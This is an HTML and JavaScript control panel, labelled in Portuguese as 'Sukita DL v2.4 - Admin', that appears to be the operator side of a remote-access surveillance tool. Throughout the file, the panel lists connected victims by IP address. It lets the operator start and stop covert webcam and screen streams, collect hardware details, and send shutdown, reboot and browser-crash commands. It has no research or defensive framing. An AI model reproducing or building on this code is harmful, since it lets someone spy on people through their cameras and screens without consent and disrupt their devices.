<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sukita v2.4 - Admin</title>
<style>
  :root {
    --bg:#121212; --fg:#eee;
    --accent:#0af; --danger:#f33;
    --card-bg:#1e1e1e; --radius:8px;
  }
  body,html {margin:0;padding:0;height:100%;background:var(--bg);color:var(--fg);font-family:sans-serif}
  .navbar {height:50px;background:#181818;display:flex;align-items:center;padding:0 10px;box-shadow:0 2px 4px rgba(0,0,0,0.5)}
  .sidebar {width:220px;background:#181818;overflow-y:auto;padding:10px}
  .sidebar .client {padding:6px 10px;border-radius:4px;cursor:pointer}
  .sidebar .client:hover {background:#222}
  #count {background:var(--accent);padding:2px 6px;border-radius:4px}
  #viewer {display:flex;flex-wrap:wrap;gap:10px;padding:10px;overflow-y:auto;flex:1;background:#111}
  .card {position:relative; background:var(--card-bg);border-radius:var(--radius);overflow:hidden;width:320px;height:200px;display:flex;flex-direction:column}
  .card img {flex:1;width:100%;object-fit:cover}
  .card .info {padding:6px;font-size:12px;background:rgba(0,0,0,0.5)}
  .btn-bar {position:absolute;top:6px;right:6px;display:flex;gap:4px}
  .btn {width:24px;height:24px;background:rgba(255,255,255,0.1);border:none;border-radius:4px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#ccc}
  .btn:hover {background:rgba(255,255,255,0.2)}
  .overlay {position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;align-items:center;justify-content:center}
  .menu {background:var(--card-bg);padding:15px;border-radius:8px;display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
  .menu .item {padding:10px;background:#222;border-radius:6px;text-align:center;cursor:pointer;font-size:12px}
  .menu .item:hover {background:#333}
  .modal {position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:var(--card-bg);padding:15px;border-radius:8px;display:none;max-width:90%;max-height:80%;overflow:auto}
  .modal h5 {margin-top:0}
  .toast {position:fixed;bottom:10px;right:10px;background:var(--accent);color:#000;padding:8px 12px;border-radius:4px;opacity:0.9;margin-top:6px}
</style>
</head>
<body>

<div class="navbar">
  <span>Sukita DL v2.4</span>
  <span style="margin-left:auto">Online: <span id="count">0</span></span>
</div>

<div style="display:flex;height:calc(100% - 50px)">
  <div class="sidebar"><div id="list"></div></div>
  <div id="viewer"></div>
</div>

<div class="overlay" id="actionMenu">
  <div class="menu" id="menuGrid">
    <div class="item" data-act="cam">Câmera</div>
    <div class="item" data-act="screen">Tela</div>
    <div class="item" data-act="stop-cam">Parar Cam</div>
    <div class="item" data-act="stop-screen">Parar Tela</div>
    <div class="item" data-act="info">Info</div>
    <div class="item" data-act="hwinfo">HW Info</div>
    <div class="item" data-act="shutdown">Desligar</div>
    <div class="item" data-act="reboot">Reiniciar</div>
    <div class="item" data-act="crash" style="color:var(--danger)">Crash!</div>
  </div>
</div>

<div class="modal" id="infoModal">
  <h5>Info do dispositivo</h5>
  <pre id="infoPre" style="font-size:12px"></pre>
  <button onclick="closeModal('infoModal')">Fechar</button>
</div>

<div id="toastContainer"></div>

<script src="/socket.io/socket.io.js"></script>
<script>
let cache = {}, currentUUID;
const socket = io({query:{role:'admin'}});
const listEl = document.getElementById('list');
const viewer = document.getElementById('viewer');

// Toast helper
function toast(msg,type='') {
  const el = document.createElement('div');
  el.className = 'toast';
  el.textContent = msg;
  document.getElementById('toastContainer').appendChild(el);
  setTimeout(() => el.remove(), 2400);
}

// List clients
socket.on('clients', arr => {
  document.getElementById('count').textContent = arr.length;
  listEl.innerHTML = '';
  arr.forEach(c=> {
    cache[c.uuid] = c;
    const div = document.createElement('div');
    div.className = 'client';
    div.textContent = c.ip;
    div.dataset.uuid = c.uuid;
    listEl.appendChild(div);
  });
});

// Click client
listEl.addEventListener('click', e => {
  const d = e.target.dataset;
  if (!d.uuid) return;
  currentUUID = d.uuid;
  document.getElementById('actionMenu').style.display = 'flex';
});

// Action menu
document.getElementById('menuGrid').addEventListener('click', e => {
  const act = e.target.dataset.act;
  document.getElementById('actionMenu').style.display = 'none';
  if (!act) return;
  const uuid = currentUUID;
  switch(act) {
    case 'cam': socket.emit('request-stream',uuid); addCard(uuid,'cam'); break;
    case 'screen': socket.emit('request-screen',uuid); addCard(uuid,'screen'); break;
    case 'stop-cam': socket.emit('stop-stream',uuid); removeCard(uuid,'cam'); break;
    case 'stop-screen': socket.emit('stop-screen',uuid); removeCard(uuid,'screen'); break;
    case 'info': showInfo(cache[uuid]); break;
    case 'hwinfo': socket.emit('request-hwinfo',uuid); toast('HW info requisitada'); break;
    case 'shutdown': socket.emit('shutdown',uuid); toast('Shutdown enviada'); break;
    case 'reboot': socket.emit('reboot',uuid); toast('Reboot enviada'); break;
    case 'crash': socket.emit('crash-browser',uuid); toast('Crash enviada','danger'); break;
  }
});

// Receive hwinfo
socket.on('hwinfo-update', ({uuid,info}) => {
  showInfo(info);
});

// Add/Remove card
function addCard(uuid, kind) {
  const id = kind+'-'+uuid;
  if (document.getElementById(id)) return;
  const c = cache[uuid];
  const card = document.createElement('div');
  card.className = 'card';
  card.id = id;
  card.innerHTML = `
    <div class="info">${c.ip} • ${kind}</div>
    <img id="img-${id}">
    <div class="btn-bar">
      <button class="btn" data-stop="${kind}">✖</button>
    </div>`;
  viewer.appendChild(card);
}

// Remove card
function removeCard(uuid, kind) {
  const el = document.getElementById(kind+'-'+uuid);
  if (el) el.remove();
}

// Update frames
socket.on('frame', d => {
  const el = document.getElementById('img-cam-'+d.id);
  if (el) el.src = d.data;
});
socket.on('screen-frame', d => {
  const el = document.getElementById('img-screen-'+d.id);
  if (el) el.src = d.data;
});

// Button stop
viewer.addEventListener('click', e => {
  const stop = e.target.dataset.stop;
  if (!stop) return;
  const uuid = e.target.closest('.card').id.split('-')[1];
  socket.emit(stop==='cam'?'stop-stream':'stop-screen',uuid);
  e.target.closest('.card').remove();
});

// Show info modal
function showInfo(info) {
  document.getElementById('infoPre').textContent = JSON.stringify(info, null, 2);
  document.getElementById('infoModal').style.display = 'block';
}
function closeModal(id) {
  document.getElementById(id).style.display = 'none';
}
</script>
</body>
</html>
